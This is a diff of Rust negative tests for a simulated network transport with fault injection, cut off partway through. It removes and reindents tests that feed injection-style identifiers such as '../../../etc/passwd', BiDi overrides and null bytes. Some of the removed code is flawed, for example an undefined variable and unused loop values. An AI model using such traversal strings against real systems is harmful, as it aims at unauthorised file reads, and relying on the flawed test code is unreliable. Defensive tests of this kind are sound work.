@@ -3675,973 +3675,22 @@ mod additional_comprehensive_negative_tests {
     mod removed_virtual_transport_api_tests {
         use super::*;
 
-    #[test]
-    fn test_invalid_probability_edge_cases() {
-        let mut vt = VirtualTransport::new(42);
+        #[test]
+        fn test_invalid_probability_edge_cases() {
+            let mut vt = VirtualTransport::new(42);
 
-        // Test invalid probability values
-        let invalid_probs = vec![
-            -0.1,              // Negative
-            1.1,               // Above 1.0
-            f64::NAN,          // NaN
-            f64::INFINITY,     // Positive infinity
-            f64::NEG_INFINITY, // Negative infinity
-            -0.0,              // Negative zero (should be valid)
-            1.0000001,         // Just above 1.0
-        ];
-
-        for prob in invalid_probs {
-            let config = LinkFaultConfig {
-                drop_probability: prob,
-                reorder_depth: 0,
-                corrupt_bit_count: 0,
-                delay_ticks: 0,
-                partition: false,
-            };
-
-            let result = vt.create_link("test-link", "node1", "node2", config.clone());
-
-            if prob.is_nan() || prob.is_infinite() || prob < 0.0 || prob > 1.0 {
-                // Should reject invalid probabilities
-                assert!(result.is_err());
-                if let Err(e) = result {
-                    assert!(e.contains("ERR_VT_INVALID_PROBABILITY"));
-                }
-            } else {
-                // Edge case: -0.0 should be valid (equals 0.0)
-                if prob == -0.0 {
-                    assert!(result.is_ok());
-                }
-            }
-        }
-    }
-
-    #[test]
-    fn test_unicode_injection_in_link_ids() {
-        let mut vt = VirtualTransport::new(123);
-        let config = LinkFaultConfig {
-            drop_probability: 0.0,
-            reorder_depth: 0,
-            corrupt_bit_count: 0,
-            delay_ticks: 0,
-            partition: false,
-        };
-
-        // Test various Unicode injection attacks in link IDs
-        let malicious_link_ids = vec![
-            "normal\u{202e}evil\u{202c}link", // BiDi override
-            "link\u{200b}\u{feff}hidden",     // Zero-width characters
-            "link\nnewline",                  // Newline injection
-            "link\ttab",                      // Tab injection
-            "link\x00null",                   // Null byte
-            "../../../etc/passwd",            // Path traversal
-            "link\"quote",                    // Quote injection
-        ];
-
-        for link_id in &malicious_link_ids {
-            let result = vt.create_link(link_id, "node1", "node2", config.clone());
-
-            // Should handle Unicode without corruption
-            assert!(result.is_ok());
-
-            // Verify link can be found with exact ID
-            assert!(vt.link_exists(link_id));
-
-            // Test message sending through Unicode link
-            let msg_result = vt.send_message(link_id, b"test-payload");
-            assert!(msg_result.is_ok());
-        }
-    }
-
-    #[test]
-    fn test_massive_message_memory_exhaustion() {
-        let mut vt = VirtualTransport::new(456);
-        let config = LinkFaultConfig {
-            drop_probability: 0.0,
-            reorder_depth: 1000, // Large reorder buffer
-            corrupt_bit_count: 0,
-            delay_ticks: 0,
-            partition: false,
-        };
-
-        vt.create_link("massive-link", "sender", "receiver", config)
-            .expect("create link");
-
-        // Test sending massive messages (100MB each)
-        let massive_payload = vec![0x42; 100 * 1024 * 1024];
-
-        for i in 0..5 {
-            let result = vt.send_message("massive-link", &massive_payload);
-            assert!(result.is_ok());
-
-            // Advance time to trigger delivery
-            vt.advance_tick(1);
-        }
-
-        // Verify transport handles large payloads without memory issues
-        let events = vt.get_event_log();
-        assert!(events.len() > 0);
-
-        // Check that messages are properly queued/delivered
-        let send_events = events
-            .iter()
-            .filter(|e| e.event_code == event_codes::VT_001)
-            .count();
-        assert_eq!(send_events, 5);
-    }
-
-    #[test]
-    fn test_arithmetic_overflow_in_tick_counts() {
-        let mut vt = VirtualTransport::new(789);
-        let config = LinkFaultConfig {
-            drop_probability: 0.0,
-            reorder_depth: 0,
-            corrupt_bit_count: 0,
-            delay_ticks: u64::MAX, // Maximum delay
-            partition: false,
-        };
-
-        vt.create_link("delay-link", "slow-sender", "patient-receiver", config)
-            .expect("create link");
-
-        // Send message with maximum delay
-        let result = vt.send_message("delay-link", b"delayed-message");
-        assert!(result.is_ok());
-
-        // Test advancing to near-overflow tick values
-        let overflow_ticks = vec![u64::MAX - 1, u64::MAX, u64::MAX / 2];
-
-        for tick in overflow_ticks {
-            // Should handle large tick advances without overflow
-            vt.advance_tick(1); // Advance incrementally to avoid issues
-        }
-
-        // Verify transport state remains consistent
-        assert!(vt.link_exists("delay-link"));
-    }
-
-    #[test]
-    fn test_reorder_depth_boundary_violations() {
-        let mut vt = VirtualTransport::new(999);
-
-        // Test extreme reorder depths
-        let boundary_depths = vec![
-            0,          // No reordering
-            1,          // Minimal reordering
-            usize::MAX, // Maximum depth
-            usize::MAX / 2,
-        ];
-
-        for (i, depth) in boundary_depths.iter().enumerate() {
-            let config = LinkFaultConfig {
-                drop_probability: 0.0,
-                reorder_depth: *depth,
-                corrupt_bit_count: 0,
-                delay_ticks: 0,
-                partition: false,
-            };
-
-            let link_id = format!("reorder-link-{}", i);
-            let result = vt.create_link(&link_id, "sender", "receiver", config);
-            assert!(result.is_ok());
-
-            // Send multiple messages to test reorder buffer
-            for j in 0..10 {
-                let payload = format!("msg-{}", j).into_bytes();
-                let msg_result = vt.send_message(&link_id, &payload);
-                assert!(msg_result.is_ok());
-            }
-        }
-    }
-
-    #[test]
-    fn test_message_corruption_bit_flip_boundaries() {
-        let mut vt = VirtualTransport::new(111);
-
-        // Test extreme corruption bit counts
-        let corruption_counts = vec![
-            0,          // No corruption
-            1,          // Single bit flip
-            8,          // Full byte corruption
-            64,         // 8 bytes worth
-            usize::MAX, // Maximum corruption (limited by payload size)
-        ];
-
-        for (i, bit_count) in corruption_counts.iter().enumerate() {
-            let config = LinkFaultConfig {
-                drop_probability: 0.0,
-                reorder_depth: 0,
-                corrupt_bit_count: *bit_count,
-                delay_ticks: 0,
-                partition: false,
-            };
-
-            let link_id = format!("corrupt-link-{}", i);
-            let result = vt.create_link(&link_id, "sender", "receiver", config);
-            assert!(result.is_ok());
-
-            // Test with payloads of different sizes
-            let test_payloads = vec![
-                vec![],           // Empty payload
-                vec![0x42],       // Single byte
-                vec![0xFF; 1024], // 1KB payload
+            // Test invalid probability values
+            let invalid_probs = vec![
+                -0.1,              // Negative
+                1.1,               // Above 1.0
+                f64::NAN,          // NaN
+                f64::INFINITY,     // Positive infinity
+                f64::NEG_INFINITY, // Negative infinity
+                -0.0,              // Negative zero (should be valid)
+                1.0000001,         // Just above 1.0
             ];
 
-            for payload in test_payloads {
-                let msg_result = vt.send_message(&link_id, &payload);
-
-                if payload.is_empty() && *bit_count > 0 {
-                    // Can't corrupt empty payload
-                    // Implementation-dependent behavior
-                } else {
-                    assert!(msg_result.is_ok());
-                }
-
-                vt.advance_tick(1);
-            }
-        }
-    }
-
-    #[test]
-    fn test_network_partition_edge_cases() {
-        let mut vt = VirtualTransport::new(222);
-        let config = LinkFaultConfig {
-            drop_probability: 0.0,
-            reorder_depth: 0,
-            corrupt_bit_count: 0,
-            delay_ticks: 0,
-            partition: false,
-        };
-
-        vt.create_link("partition-link", "isolated1", "isolated2", config)
-            .expect("create link");
-
-        // Test partition/heal cycles
-        for cycle in 0..100 {
-            // Partition the link
-            let partition_result = vt.partition_link("partition-link");
-            assert!(partition_result.is_ok());
-
-            // Try to send during partition (should fail or be dropped)
-            let send_result = vt.send_message("partition-link", b"blocked-message");
-            // Implementation may allow queueing or reject immediately
-
-            // Heal the partition
-            let heal_result = vt.heal_partition("partition-link");
-            assert!(heal_result.is_ok());
-
-            // Send should work after healing
-            let heal_send_result =
-                vt.send_message("partition-link", &format!("cycle-{}", cycle).into_bytes());
-            assert!(heal_send_result.is_ok());
-
-            vt.advance_tick(1);
-        }
-
-        // Verify partition events logged correctly
-        let events = vt.get_event_log();
-        let partition_events = events
-            .iter()
-            .filter(|e| e.event_code == event_codes::VT_005)
-            .count();
-        let heal_events = events
-            .iter()
-            .filter(|e| e.event_code == event_codes::VT_006)
-            .count();
-        assert_eq!(partition_events, heal_events); // Should be balanced
-    }
-
-    #[test]
-    fn test_concurrent_transport_access_safety() {
-        use std::sync::{Arc, Barrier, Mutex};
-        use std::thread;
-
-        let vt = Arc::new(Mutex::new(VirtualTransport::new(333)));
-        let barrier = Arc::new(Barrier::new(4));
-
-        // Pre-create link for all threads to use
-        {
-            let mut vt_lock = try_lock(&vt, "pre-create shared virtual transport link");
-            let config = LinkFaultConfig {
-                drop_probability: 0.1,
-                reorder_depth: 5,
-                corrupt_bit_count: 1,
-                delay_ticks: 0,
-                partition: false,
-            };
-            vt_lock
-                .create_link("shared-link", "multi-sender", "multi-receiver", config)
-                .expect("create shared link");
-        }
-
-        let handles: Vec<_> = (0..4)
-            .map(|i| {
-                let vt = Arc::clone(&vt);
-                let barrier = Arc::clone(&barrier);
-
-                thread::spawn(move || {
-                    barrier.wait();
-
-                    // Each thread sends multiple messages
-                    for j in 0..10 {
-                        let payload = format!("thread-{}-msg-{}", i, j).into_bytes();
-
-                        let mut vt_lock =
-                            try_lock(&vt, "send concurrent virtual transport message");
-                        let result = vt_lock.send_message("shared-link", &payload);
-
-                        // Should handle concurrent access safely
-                        assert!(result.is_ok());
-
-                        vt_lock.advance_tick(1);
-                    }
-                })
-            })
-            .collect();
-
-        // Wait for all threads to complete
-        for handle in handles {
-            handle.join().expect("thread should complete");
-        }
-
-        // Verify final state is consistent
-        let vt_lock = try_lock(&vt, "inspect final virtual transport state");
-        assert!(vt_lock.link_exists("shared-link"));
-        let events = vt_lock.get_event_log();
-        assert!(events.len() > 0);
-    }
-
-    #[test]
-    fn test_message_id_exhaustion_edge_case() {
-        let mut vt = VirtualTransport::new(444);
-        let config = LinkFaultConfig {
-            drop_probability: 0.0,
-            reorder_depth: 0,
-            corrupt_bit_count: 0,
-            delay_ticks: 0,
-            partition: false,
-        };
-
-        vt.create_link(
-            "exhaustion-link",
-            "stress-sender",
-            "stress-receiver",
-            config,
-        )
-        .expect("create link");
-
-        // Send messages until ID space is stressed
-        // Note: Real exhaustion would require 2^64 messages, so we test the boundary logic
-        for i in 0..10000 {
-            let payload = format!("stress-test-{}", i).into_bytes();
-            let result = vt.send_message("exhaustion-link", &payload);
-
-            // Should continue working for reasonable message counts
-            assert!(result.is_ok());
-
-            if i % 1000 == 0 {
-                vt.advance_tick(1); // Periodic tick advance
-            }
-        }
-
-        // Transport should remain functional
-        assert!(vt.link_exists("exhaustion-link"));
-        let final_result = vt.send_message("exhaustion-link", b"final-test");
-        assert!(final_result.is_ok());
-    }
-
-    #[test]
-    fn test_floating_point_precision_corruption_rates() {
-        let mut vt = VirtualTransport::new(555);
-
-        // Test floating point precision edge cases for drop probability
-        let precision_probs = vec![
-            0.0000000001,       // Very small positive
-            0.9999999999,       // Very close to 1.0
-            0.5,                // Exact half
-            1.0 - f64::EPSILON, // Just below 1.0
-            f64::EPSILON,       // Smallest positive normal
-            0.3333333333333333, // Repeating decimal
-        ];
-
-        for (i, prob) in precision_probs.iter().enumerate() {
-            let config = LinkFaultConfig {
-                drop_probability: *prob,
-                reorder_depth: 0,
-                corrupt_bit_count: 0,
-                delay_ticks: 0,
-                partition: false,
-            };
-
-            let link_id = format!("precision-link-{}", i);
-            let result = vt.create_link(&link_id, "precise-sender", "precise-receiver", config);
-            assert!(result.is_ok());
-
-            // Send many messages to test probability precision
-            let mut successful_sends = 0;
-            for j in 0..1000 {
-                let payload = format!("precision-{}", j).into_bytes();
-                let send_result = vt.send_message(&link_id, &payload);
-
-                if send_result.is_ok() {
-                    successful_sends += 1;
-                }
-
-                vt.advance_tick(1);
-            }
-
-            // Verify reasonable success rate based on drop probability
-            let success_rate = successful_sends as f64 / 1000.0;
-            let expected_success_rate = 1.0 - prob;
-
-            // Allow 10% tolerance for randomness
-            let tolerance = 0.1;
-            assert!(
-                (success_rate - expected_success_rate).abs() <= tolerance,
-                "Success rate {} too far from expected {} for probability {}",
-                success_rate,
-                expected_success_rate,
-                prob
-            );
-        }
-    }
-
-    #[test]
-    fn negative_virtual_transport_comprehensive_unicode_node_id_injection() {
-        // Test comprehensive Unicode injection resistance in node IDs
-        let mut vt = VirtualTransport::new(777);
-
-        let malicious_node_patterns = [
-            "\u{202E}\u{202D}fake_node\u{202C}".to_string(), // Right-to-left override
-            "node\u{000A}\u{000D}injected\x00nulls".to_string(), // CRLF + null injection
-            "\u{FEFF}bom_node\u{FFFE}reversed".to_string(),  // BOM injection attacks
-            "\u{200B}\u{200C}\u{200D}zero_width".to_string(), // Zero-width characters
-            "节点\u{007F}\u{0001}\u{001F}控制".to_string(),  // Unicode + control chars
-            "\u{FFFF}\u{FFFE}\u{FDD0}non_chars".to_string(), // Non-character code points
-            "🚀💻\u{1F4A5}💥\u{1F52B}🔫".to_string(),        // Complex emoji sequences
-            "\u{0300}\u{0301}\u{0302}combining".to_string(), // Combining marks
-            "a".repeat(100_000),                             // Extremely long node ID
-            format!("{}\x00hidden_content", "visible"),      // Null byte injection
-        ];
-
-        for (i, pattern) in malicious_node_patterns.iter().enumerate() {
-            let link_id = format!("unicode_test_link_{}", i);
-            let source_node = format!("src_{}{}", pattern, i);
-            let target_node = format!("tgt_{}{}", pattern, i);
-
-            let config = LinkFaultConfig {
-                drop_probability: 0.0,
-                reorder_depth: 0,
-                corrupt_bit_count: 0,
-                delay_ticks: 0,
-                partition: false,
-            };
-
-            // Should handle Unicode node IDs gracefully
-            let result = vt.create_link(&link_id, &source_node, &target_node, config);
-
-            match result {
-                Ok(_) => {
-                    // If link creation succeeds, test message sending
-                    let test_payload = format!("unicode_test_payload_{}", i).as_bytes().to_vec();
-                    let send_result = vt.send_message(&link_id, &test_payload);
-
-                    match send_result {
-                        Ok(msg_id) => {
-                            // Verify message structure is not corrupted by Unicode
-                            assert!(msg_id > 0);
-
-                            // Check if message can be delivered
-                            vt.advance_tick(1);
-                            let delivered = vt.collect_delivered_messages(&target_node);
-
-                            // Delivery may succeed or fail, but should not crash
-                            for msg in delivered {
-                                assert_eq!(msg.payload, test_payload);
-                                assert!(msg.source.contains(&format!("{}", i)));
-                                assert!(msg.target.contains(&format!("{}", i)));
-                            }
-                        }
-                        Err(_) => {
-                            // Acceptable to reject extreme Unicode patterns
-                        }
-                    }
-                }
-                Err(_) => {
-                    // Acceptable to reject malicious node ID patterns
-                }
-            }
-
-            // Event log should handle Unicode gracefully without corruption
-            let events = vt.event_log();
-            for event in events {
-                // All event fields should remain valid UTF-8
-                assert!(!event.event_code.contains('\0'));
-                if !event.link_id.is_empty() {
-                    assert!(!event.link_id.contains('\0'));
-                }
-                // Message content corruption is expected for corruption tests, but structure should be intact
-            }
-        }
-    }
-
-    #[test]
-    fn negative_message_payload_extreme_size_and_corruption_boundaries() {
-        // Test extreme message payload sizes and corruption boundary conditions
-        let mut vt = VirtualTransport::new(888);
-
-        let config = LinkFaultConfig {
-            drop_probability: 0.0,
-            reorder_depth: 0,
-            corrupt_bit_count: 8, // 1 byte corruption
-            delay_ticks: 0,
-            partition: false,
-        };
-
-        vt.create_link("extreme-test", "extreme-src", "extreme-tgt", config)
-            .expect("create extreme test link");
-
-        // Test various extreme payload sizes
-        let extreme_payloads = vec![
-            Vec::new(),                                               // Empty payload
-            vec![0u8; 1],                                             // Single byte
-            vec![0xFF; 1024],                                         // All ones, 1KB
-            vec![0x00; 1024],                                         // All zeros, 1KB
-            (0..256).map(|i| i as u8).cycle().take(10_000).collect(), // Pattern, 10KB
-            vec![0x42; 1_000_000],                                    // Large payload, 1MB
-            (0..100_000).map(|i| (i % 256) as u8).collect(),          // Sequence pattern
-        ];
-
-        for (i, payload) in extreme_payloads.into_iter().enumerate() {
-            let original_len = payload.len();
-            let original_checksum: u32 = payload.iter().map(|&b| b as u32).sum();
-
-            let result = vt.send_message("extreme-test", &payload);
-
-            match result {
-                Ok(msg_id) => {
-                    assert!(msg_id > 0);
-
-                    // Advance time to allow delivery
-                    vt.advance_tick(1);
-
-                    // Collect delivered messages
-                    let delivered = vt.collect_delivered_messages("extreme-tgt");
-
-                    // May have been corrupted due to fault injection
-                    for msg in delivered {
-                        assert_eq!(msg.id, msg_id);
-                        assert_eq!(msg.source, "extreme-src");
-                        assert_eq!(msg.target, "extreme-tgt");
-                        assert_eq!(msg.payload.len(), original_len);
-
-                        // With 8-bit corruption, payload should differ by exactly 8 bits
-                        if corrupt_bit_count > 0 {
-                            let received_checksum: u32 =
-                                msg.payload.iter().map(|&b| b as u32).sum();
-                            // Checksum will likely differ, but length should be preserved
-                            // For large payloads, corruption should be minimal relative change
-                            if original_len > 1000 {
-                                let bit_diff_estimate =
-                                    original_checksum.abs_diff(received_checksum);
-                                // Should be reasonable corruption (8 bits flipped max)
-                                assert!(
-                                    bit_diff_estimate <= 8 * 256,
-                                    "Corruption too extensive for payload {}",
-                                    i
-                                );
-                            }
-                        }
-                    }
-                }
-                Err(_) => {
-                    // Large payloads may be rejected - acceptable
-                    assert!(
-                        original_len > 100_000,
-                        "Small payloads should not be rejected"
-                    );
-                }
-            }
-        }
-
-        // Test boundary conditions for bit corruption
-        let boundary_configs = [
-            LinkFaultConfig {
-                drop_probability: 0.0,
-                reorder_depth: 0,
-                corrupt_bit_count: 0, // No corruption
-                delay_ticks: 0,
-                partition: false,
-            },
-            LinkFaultConfig {
-                drop_probability: 0.0,
-                reorder_depth: 0,
-                corrupt_bit_count: 1, // Single bit
-                delay_ticks: 0,
-                partition: false,
-            },
-            LinkFaultConfig {
-                drop_probability: 0.0,
-                reorder_depth: 0,
-                corrupt_bit_count: 64, // Many bits
-                delay_ticks: 0,
-                partition: false,
-            },
-            LinkFaultConfig {
-                drop_probability: 0.0,
-                reorder_depth: 0,
-                corrupt_bit_count: 10_000, // Extreme corruption
-                delay_ticks: 0,
-                partition: false,
-            },
-        ];
-
-        for (i, config) in boundary_configs.into_iter().enumerate() {
-            let link_id = format!("corruption_boundary_{}", i);
-            let result = vt.create_link(&link_id, "corrupt-src", "corrupt-tgt", config);
-
-            if result.is_ok() {
-                let test_payload = format!("boundary_test_{}", i)
-                    .repeat(100)
-                    .as_bytes()
-                    .to_vec();
-                let send_result = vt.send_message(&link_id, &test_payload);
-
-                // Should handle extreme corruption settings gracefully
-                match send_result {
-                    Ok(_) => {
-                        vt.advance_tick(1);
-                        let _delivered = vt.collect_delivered_messages("corrupt-tgt");
-                        // Any result is acceptable as long as no panic
-                    }
-                    Err(_) => {
-                        // May reject extreme corruption settings
-                    }
-                }
-            }
-        }
-    }
-
-    #[test]
-    fn negative_reorder_buffer_overflow_and_memory_exhaustion() {
-        // Test reorder buffer overflow and memory exhaustion scenarios
-        let mut vt = VirtualTransport::new(999);
-
-        // Test extreme reorder depths
-        let extreme_reorder_configs = [
-            0,          // No reordering
-            1,          // Minimal reordering
-            1000,       // Large buffer
-            100_000,    // Massive buffer
-            usize::MAX, // Maximum possible
-        ];
-
-        for (i, reorder_depth) in extreme_reorder_configs.into_iter().enumerate() {
-            let config = LinkFaultConfig {
-                drop_probability: 0.0,
-                reorder_depth,
-                corrupt_bit_count: 0,
-                delay_ticks: 0,
-                partition: false,
-            };
-
-            let link_id = format!("reorder_test_{}", i);
-            let result = vt.create_link(&link_id, "reorder-src", "reorder-tgt", config);
-
-            match result {
-                Ok(_) => {
-                    // Send many messages to stress the reorder buffer
-                    for j in 0..min(reorder_depth + 100, 10_000) {
-                        let payload = format!("reorder_msg_{}_{}", i, j).as_bytes().to_vec();
-                        let send_result = vt.send_message(&link_id, &payload);
-
-                        match send_result {
-                            Ok(_) => {
-                                // Periodically advance time
-                                if j % 100 == 0 {
-                                    vt.advance_tick(1);
-                                }
-                            }
-                            Err(_) => {
-                                // May hit memory or other limits
-                                break;
-                            }
-                        }
-                    }
-
-                    // Force delivery of remaining messages
-                    for _tick in 0..100 {
-                        vt.advance_tick(1);
-                        let delivered = vt.collect_delivered_messages("reorder-tgt");
-
-                        // Verify delivered messages maintain integrity
-                        for msg in delivered {
-                            assert!(msg.source == "reorder-src");
-                            assert!(msg.target == "reorder-tgt");
-                            assert!(!msg.payload.is_empty());
-                            assert!(msg.tick_delivered.is_some());
-                        }
-                    }
-                }
-                Err(_) => {
-                    // Extreme reorder depths may be rejected
-                    assert!(
-                        reorder_depth > 50_000,
-                        "Reasonable reorder depths should be accepted"
-                    );
-                }
-            }
-        }
-
-        // Test memory pressure with concurrent reordering on multiple links
-        for i in 0..100 {
-            let config = LinkFaultConfig {
-                drop_probability: 0.0,
-                reorder_depth: 1000, // Moderate reordering on many links
-                corrupt_bit_count: 0,
-                delay_ticks: 0,
-                partition: false,
-            };
-
-            let link_id = format!("concurrent_reorder_{}", i);
-            if vt
-                .create_link(
-                    &link_id,
-                    &format!("src_{}", i),
-                    &format!("tgt_{}", i),
-                    config,
-                )
-                .is_ok()
-            {
-                // Send a few messages on each link
-                for j in 0..10 {
-                    let payload = format!("concurrent_{}_{}", i, j).as_bytes().to_vec();
-                    let _result = vt.send_message(&link_id, &payload);
-                }
-            }
-        }
-
-        // Advance time to trigger reorder buffer processing across all links
-        for _tick in 0..50 {
-            vt.advance_tick(1);
-        }
-
-        // System should remain stable despite memory pressure
-        let events = vt.event_log();
-        assert!(events.len() <= DEFAULT_MAX_EVENT_LOG_ENTRIES);
-
-        // All events should be well-formed
-        for event in events {
-            assert!(!event.event_code.is_empty());
-            assert!(event.tick >= 0);
-        }
-    }
-
-    #[test]
-    fn negative_tick_overflow_and_time_manipulation_edge_cases() {
-        // Test tick counter overflow and extreme time manipulation scenarios
-        let mut vt = VirtualTransport::new(1111);
-
-        let config = LinkFaultConfig {
-            drop_probability: 0.0,
-            reorder_depth: 5,
-            corrupt_bit_count: 0,
-            delay_ticks: u64::MAX / 2, // Extreme delay
-            partition: false,
-        };
-
-        vt.create_link("time-test", "time-src", "time-tgt", config)
-            .expect("create time test link");
-
-        // Test near u64::MAX tick values
-        let extreme_ticks = [
-            0,               // Start time
-            1,               // Minimal advance
-            1000,            // Normal operation
-            u64::MAX / 2,    // Mid-range
-            u64::MAX - 1000, // Near overflow
-            u64::MAX - 1,    // Just before overflow
-            u64::MAX,        // Maximum value
-        ];
-
-        for target_tick in extreme_ticks {
-            let current_tick = vt.current_tick();
-
-            // Attempt to jump to target tick (may overflow)
-            if target_tick > current_tick {
-                let advance_amount = target_tick.saturating_sub(current_tick);
-
-                // Advance in chunks to avoid potential infinite loops
-                let chunk_size = min(advance_amount, 1_000_000);
-                let chunks = advance_amount / chunk_size;
-
-                for _chunk in 0..min(chunks, 1000) {
-                    // Limit chunks to prevent test timeout
-                    vt.advance_tick(chunk_size);
-
-                    // Send test message at extreme tick values
-                    let payload = format!("tick_test_at_{}", vt.current_tick())
-                        .as_bytes()
-                        .to_vec();
-                    let result = vt.send_message("time-test", &payload);
-
-                    match result {
-                        Ok(msg_id) => {
-                            // Message should have reasonable timestamp
-                            assert!(msg_id > 0);
-                        }
-                        Err(_) => {
-                            // May fail at extreme tick values
-                        }
-                    }
-
-                    // Check for overflow issues
-                    let new_tick = vt.current_tick();
-                    assert!(new_tick >= current_tick, "Tick should not go backwards");
-
-                    // Stop if we've reached reasonable advancement
-                    if new_tick >= target_tick || _chunk >= 100 {
-                        break;
-                    }
-                }
-            }
-        }
-
-        // Test delivery at extreme future times
-        let future_messages = vt.collect_delivered_messages("time-tgt");
-        for msg in future_messages {
-            // Messages should have consistent timing
-            if let Some(delivered_tick) = msg.tick_delivered {
-                assert!(
-                    delivered_tick >= msg.tick_created,
-                    "Delivery time should not precede creation time"
-                );
-
-                // Check for overflow in tick arithmetic
-                assert!(
-                    delivered_tick < u64::MAX,
-                    "Delivered tick should not overflow"
-                );
-            }
-        }
-
-        // Event log should handle extreme tick values
-        let events = vt.event_log();
-        for event in events {
-            assert!(event.tick <= vt.current_tick());
-            assert!(!event.event_code.is_empty());
-        }
-    }
-
-    #[test]
-    fn negative_probability_edge_cases_and_floating_point_attacks() {
-        // Test edge cases in probability calculations and floating-point vulnerabilities
-        let mut vt = VirtualTransport::new(2222);
-
-        // Extreme and malicious probability values
-        let malicious_probabilities = [
-            f64::NAN,                           // Not a number
-            f64::INFINITY,                      // Positive infinity
-            f64::NEG_INFINITY,                  // Negative infinity
-            -0.0,                               // Negative zero
-            -1.0,                               // Invalid negative
-            2.0,                                // Invalid > 1.0
-            f64::MIN,                           // Smallest finite value
-            f64::MAX,                           // Largest finite value
-            f64::EPSILON,                       // Machine epsilon
-            1.0 + f64::EPSILON,                 // Just above 1.0
-            -f64::EPSILON,                      // Just below 0.0
-            0.5000000000000001,                 // Precision edge case
-            1.0 / 3.0,                          // Repeating decimal
-            f64::from_bits(0x7FF8000000000001), // Specific NaN pattern
-            f64::from_bits(0xFFF8000000000001), // Different NaN pattern
-        ];
-
-        for (i, prob) in malicious_probabilities.into_iter().enumerate() {
-            let config = LinkFaultConfig {
-                drop_probability: prob,
-                reorder_depth: 0,
-                corrupt_bit_count: 0,
-                delay_ticks: 0,
-                partition: false,
-            };
-
-            let link_id = format!("prob_test_{}", i);
-            let result = vt.create_link(&link_id, "prob-src", "prob-tgt", config);
-
-            // Should validate and reject invalid probabilities
-            match result {
-                Ok(_) => {
-                    // If accepted, probability should be in valid range
-                    assert!(
-                        prob.is_finite() && prob >= 0.0 && prob <= 1.0,
-                        "Invalid probability {} was accepted",
-                        prob
-                    );
-
-                    // Test message sending with potentially dangerous probability
-                    for j in 0..100 {
-                        let payload = format!("prob_test_{}_{}", i, j).as_bytes().to_vec();
-                        let send_result = vt.send_message(&link_id, &payload);
-
-                        match send_result {
-                            Ok(_) => {
-                                vt.advance_tick(1);
-                            }
-                            Err(_) => {
-                                // Some sends may fail due to drop probability
-                            }
-                        }
-                    }
-
-                    // Verify system stability after probability calculations
-                    let delivered = vt.collect_delivered_messages("prob-tgt");
-                    let delivery_count = delivered.len();
-
-                    // With valid probabilities, should get reasonable delivery rates
-                    if prob == 0.0 {
-                        assert_eq!(
-                            delivery_count, 100,
-                            "Zero drop probability should deliver all messages"
-                        );
-                    } else if prob == 1.0 {
-                        assert_eq!(
-                            delivery_count, 0,
-                            "100% drop probability should deliver no messages"
-                        );
-                    }
-                    // Other valid probabilities should give intermediate results
-                }
-                Err(err) => {
-                    // Invalid probabilities should be rejected with proper error
-                    match err {
-                        VirtualTransportError::InvalidProbability { field, value } => {
-                            assert_eq!(field, "drop_probability");
-                            assert!(
-                                (value.is_nan() || value < 0.0 || value > 1.0),
-                                "Error should be for invalid probability, got value: {}",
-                                value
-                            );
-                        }
-                        _ => {
-                            // Other error types may be valid for extreme values
-                        }
-                    }
-                }
-            }
-        }
-
-        // Test floating-point precision attacks in batch operations
-        let precision_attacks = [
-            vec![0.1; 10],                                 // Repeated 0.1 (known precision issues)
-            vec![0.3333333333333333; 10],                  // Repeated 1/3
-            (0..100).map(|i| (i as f64) * 0.01).collect(), // 0.00, 0.01, 0.02, ...
-        ];
-
-        for (attack_idx, probs) in precision_attacks.into_iter().enumerate() {
-            let mut accumulated_error = 0.0;
-
-            for (i, prob) in probs.into_iter().enumerate() {
+            for prob in invalid_probs {
                 let config = LinkFaultConfig {
                     drop_probability: prob,
                     reorder_depth: 0,
@@ -4650,1426 +3699,2384 @@ mod additional_comprehensive_negative_tests {
                     partition: false,
                 };
 
-                let link_id = format!("precision_attack_{}_{}", attack_idx, i);
-                if vt
-                    .create_link(&link_id, "precision-src", "precision-tgt", config)
-                    .is_ok()
-                {
-                    // Test that accumulated floating-point errors don't cause issues
-                    accumulated_error += prob;
+                let result = vt.create_link("test-link", "node1", "node2", config.clone());
 
-                    // Should handle precision issues gracefully
-                    let test_payload = format!("precision_{}", i).as_bytes().to_vec();
-                    let _result = vt.send_message(&link_id, &test_payload);
-                }
-            }
-
-            // System should remain stable despite floating-point precision issues
-            vt.advance_tick(10);
-            let events = vt.event_log();
-            assert!(events.len() <= DEFAULT_MAX_EVENT_LOG_ENTRIES);
-        }
-    }
-
-    #[test]
-    fn negative_link_lifecycle_race_conditions_and_state_corruption() {
-        // Test race conditions and state corruption in link lifecycle management
-        let mut vt = VirtualTransport::new(3333);
-
-        // Rapid link creation/destruction cycles
-        for cycle in 0..100 {
-            let link_id = format!("race_link_{}", cycle);
-            let config = LinkFaultConfig::default();
-
-            // Create link
-            let create_result = vt.create_link(&link_id, "race-src", "race-tgt", config);
-            assert!(create_result.is_ok());
-
-            // Immediately send messages
-            for i in 0..10 {
-                let payload = format!("race_msg_{}_{}", cycle, i).as_bytes().to_vec();
-                let _send_result = vt.send_message(&link_id, &payload);
-            }
-
-            // Destroy link while messages may be in flight
-            let destroy_result = vt.destroy_link(&link_id);
-            assert!(destroy_result.is_ok());
-
-            // Attempt operations on destroyed link
-            let payload = b"after_destroy".to_vec();
-            let after_destroy = vt.send_message(&link_id, &payload);
-            assert!(after_destroy.is_err(), "Should not send on destroyed link");
-
-            // Attempt to recreate with same ID
-            let recreate_result = vt.create_link(
-                &link_id,
-                "race-src2",
-                "race-tgt2",
-                LinkFaultConfig::default(),
-            );
-            assert!(
-                recreate_result.is_ok(),
-                "Should be able to recreate destroyed link"
-            );
-
-            // Advance time occasionally
-            if cycle % 10 == 0 {
-                vt.advance_tick(1);
-            }
-        }
-
-        // Test concurrent modifications of multiple links
-        let base_links = [
-            "concurrent_a",
-            "concurrent_b",
-            "concurrent_c",
-            "concurrent_d",
-        ];
-
-        // Create base links
-        for link_id in &base_links {
-            let config = LinkFaultConfig {
-                drop_probability: 0.1,
-                reorder_depth: 10,
-                corrupt_bit_count: 1,
-                delay_ticks: 5,
-                partition: false,
-            };
-            vt.create_link(link_id, "concurrent-src", "concurrent-tgt", config)
-                .expect("create concurrent link");
-        }
-
-        // Simulate concurrent operations
-        for round in 0..50 {
-            // Send messages on all links
-            for link_id in &base_links {
-                let payload = format!("concurrent_round_{}", round).as_bytes().to_vec();
-                let _result = vt.send_message(link_id, &payload);
-            }
-
-            // Modify link configurations
-            for (i, link_id) in base_links.iter().enumerate() {
-                if round % (i + 2) == 0 {
-                    // Toggle partition state
-                    let new_config = LinkFaultConfig {
-                        drop_probability: 0.2,
-                        reorder_depth: 5,
